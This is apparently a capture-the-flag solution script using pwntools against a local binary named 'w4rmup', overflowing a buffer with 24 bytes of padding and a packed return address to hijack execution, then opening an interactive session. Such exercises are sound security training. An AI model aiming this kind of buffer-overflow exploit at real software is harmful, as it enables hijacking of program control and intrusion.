#!/usr/bin/python2.7

from pwn import *

p = process("./w4rmup")

payload = "A" * 24 + p64(0x00000000004011fc)
pause()
p.sendline(payload)
p.interactive()